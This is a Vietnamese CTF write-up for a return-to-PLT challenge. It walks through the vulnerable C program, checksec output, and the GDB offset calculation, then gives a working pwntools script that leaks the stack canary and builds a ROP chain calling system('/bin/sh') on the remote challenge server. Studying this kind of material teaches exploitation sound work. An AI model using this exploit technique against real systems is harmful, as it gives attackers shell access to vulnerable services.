* C
```sh
// Name: rtl.c
// Compile: gcc -o rtl rtl.c -fno-PIE -no-pie

#include <stdio.h>
#include <unistd.h>

const char* binsh = "/bin/sh";

int main() {
  char buf[0x30];

  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);

  // Add system function to plt's entry
  system("echo 'system@plt'");

  // Leak canary
  printf("[1] Leak Canary\n");
  printf("Buf: ");
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  // Overwrite return address
  printf("[2] Overwrite return address\n");
  printf("Buf: ");
  read(0, buf, 0x100);

  return 0;
}
```
* Analysis 
  - kiểm tra các cơ chế bảo vệ `pwn checksec ./rtl`:
   + <img width="430" height="75" alt="image" src="https://github.com/user-attachments/assets/a997afeb-2e23-495c-a5c4-46d240d67974" />
   + `NX enabled` là ko thể thực thi sellcode trên stack
   + `Canary found` có chim hoàng yến canh gác địa chỉ trả về
  - Nhìn vào mã nguồn C ta thấy : 
   + ` char buf[0x30];` : Biến `buf` chỉ đc cấp phát 0x30 byte
   + `read(0, buf, 0x100);` : Hàm `read` lại cho phép nhập tới 256byte 
  -> Ta có thể thấy đc đây là 1 lỗi buffer overflow , cho phép chúng ta ghi đè ngoài vùng nhớ của hàm `buf` 
  - Nhưng vì NX đang bật nên chúng ta ko thể bơm shellcode vào stack đc mà phải sử dụng các hàm có sẵn trong tiến trình `system@plt`
   + `const char* binsh = "/bin/sh";` và  `system("echo 'system@plt'");`


* Exploi : 
   - GD1: Vì có canary bảo vệ địa chỉ trả về nên trước tiên ta cần leak canary ra trước bằng cách nhập dữ liệu vừa đủ để ghi đè lên byte `\x00` đầu tiên của Canary, hàm `printf`sẽ in ra và làm rò rỉ 7 byte Canary  còn lại 
   - GD2: Ta nhập lại Canary vào đúng vị trí để có thể vượt qua kiểm tra, sau đó ghi đè địa chỉ trả về bằng 1 chuỗi ROP để thiết lập đối số và gọi `system("/bin/sh")` 
   - GD3: Để gọi được `system("/bin/sh")` trên kiến trúc x86-64 thì quy ước gọi hàm yêu cầu đối số thứ nhất phải nằm trong thanh ghi `rdi` nên ta cần chuẩn bị : 
     + Địa chỉ của `system@plt`: có thể lấy được dễ dành qua cú pháp `e.plt['system']` của pwntools hoặc sử dụng `info func @plt` trong GDB để lấy đc địa chỉ chính xác của `system@plt`
    
    <img width="212" height="92" alt="image" src="https://github.com/user-attachments/assets/9a7faa7a-b7c1-479f-813a-d81f319760c1" />

     + Chuỗi "/bin/sh" nằm sẵn trong file binary, ta lấy qua `next(e.share(b"/bin/sh"))` hoặc sử dụng lệnh `grep /bin/sh` hay `search-pattern "/bin/sh"` 
     + Tìm ROP gadgets `pop rdi; ret` : một đoạn mã dùng để bốc giá trị trên cùng của của stack bỏ vào `rdi` : `ROPgasdget --binary ./rtl --re "pop rdi"` trong terminal 
     + gadget `ret` : dùng để căn chỉnh ngăn xếp
     + <img width="541" height="453" alt="image" src="https://github.com/user-attachments/assets/b9cc1fb5-be54-4e6a-b1dc-5a491396aca9" />
  
    Ta thấy ngay địa chỉa của `pop rdi; ret` và `ret`

  - Khoảng các từ `buf` đến `return address` của hàm real được tính như sau :
    + Ta đặt breakpoint tại địa chỉ của hàm `read` đầu tiên, khi hàm read được thực thi thì ta nhập thử 1 chuỗi 8 byte rác vào sẽ thấy nó đẩy ngay hàm buf, ta thấy được địa chỉ của hàm buf
    + khi dùng lệnh `info frame` để tìm địa chỉ của return address thì thấy `rip at 0x7fffffffdc98` đây chính là địa chỉ của return address
    + Ta thực hiện lệnh tính toán khoảng cách `p 0x7fffffffdc98 - 0x00007fffffffdc50` để tính ra khoảng cách giữa hàm buf và return address là `0x48` byte
    + <img width="458" height="297" alt="image" src="https://github.com/user-attachments/assets/f8f038b6-e607-4075-a9f1-36387ea08813" />
-
```sh
    Địa chỉ cao (High Address)
   |----------------------|
   |    Return Address    | (8 byte)  <-- Đích đến ta cần ghi đè
   |----------------------|
   |      Saved RBP       | (8 byte)  
   |----------------------|
   |       Canary         | (8 byte)  <-- Chốt chặn cần bảo toàn
   |----------------------|
   |       Padding        | (8 byte)  <-- đây là khoảng cách = khoảng cách(giữa buf và return address) -  0x30 byte(buf)
   |----------------------|
   |      buf[0x30]       | (48 byte) <-- Nơi ta bắt đầu nhập dữ liệu
   |----------------------|
    Địa chỉ thấp (Low Address)
```

 ** Lưu ý ** : Trong môi trường linux 64-bit nhứ ubuntu, các hàm thư viện như `glibc`(như `system`) sẽ yêu   cầu ngăn xếp phải được căn chỉnh 16-bite ngay trước khi lệnh `call` được thực thi nếu như bị lệch 8 byte    lỗi bộ nhớ sẽ văng ra `Segmentation Fault` 
- khi ấy ta có cấu trúc stack payload như sau:  
  + Padding: `0x38` byte rác để đầy `buf` và chạm tới Canary
  + Canary: `8` byte chứa giá trị của canary ta leak ra được ở GD1
  + Saved RBP: `8` byte rác để ghi đè lên RBP cũ
  + Gadget `ret`: Lệnh này sẽ đẩy thanh ghi `rsp` lên 8 byte , giúp sửa lại sự căn chỉnh ngăn xếp cho khớp ranh giới 16 byte
  + Gadget `pop rdi; ret`: Chuyển hướng thực thi vào đây
   + Địa chỉ "/bin/sh": `pop rdi` ăn con trỏ này nhét vào thanh `rdi`
   + Địa chỉ `system@plt`: lệnh `ret` sẽ nhảy tới đây, thưc thi hàm `system` với đối số đã được chuẩn bị sẵn

- Script :

```sh
 from pwn import *
 context.arch = 'amd64'

 e = ELF('./rtl')
 p = remote('host3.dreamhack.games' ,21294)


 # leak canary
 buf = b'A' * 0x39
 p.sendafter(b'Buf: ', buf)
 p.recvuntil(buf)
 canary = u64(b'\x00' + p.recvn(7))

 # Địa chỉ là ROPgadget
 system_plt = e.plt['system']
 binsh = next(e.search(b'/bin/sh'))
 pop_rdi = 0x0000000000400853
 ret = 0x0000000000400596

 # payload
 payload = b'A' * 0x38 + p64(canary) + b'A' * 8
 payload += p64(ret)                    # khắc phục lỗi Stack Aligment
 payload += p64(pop_rdi)                # Ghi đè return address để nhảy vào pop rdi
 payload += p64(binsh)                  # Đối số cho system
 payload += p64(system_plt)             # Gọi hàm system

 p.sendafter(b'Buf: ', payload)
 p.interactive()

```
* ```
  |----------------------|
  | system@plt           | <-- (4) Lệnh 'ret' thứ 2 bắn tới đây. Thực thi system("/bin/sh")
  |----------------------|
  | địa chỉ "/bin/sh"    | <-- (3) Bị 'pop rdi' nuốt vào thanh ghi rdi (Làm đối số)
  |----------------------|
  | địa chỉ pop rdi; ret | <-- (2) Lệnh 'ret' thứ 1 bắn tới đây. Bắt đầu thực thi gadget.
  |----------------------|
  | địa chỉ ret (Gadget) | <-- (1) main() kết thúc, bắn tới đây. Dịch chuyển stack 8 byte.
  |----------------------|
  ```
  - Khi NX được bật, thay vì dùng shellcode, ta xây dựng ROP chain. Tại Return Address, ta đặt một lệnh `ret` để sửa lỗi Stack Alignment. Lệnh `ret` này kéo execution flow đến gadget `pop rdi; ret`. Lệnh `pop rdi` sẽ nuốt địa chỉ của chuỗi `'/bin/sh'` trên stack vào thanh ghi `$rdi` để làm đối số 1. Cuối cùng, lệnh `ret` của gadget sẽ bốc địa chỉ `system@plt` trên stack để thực thi hàm với đối số đã được nạp.
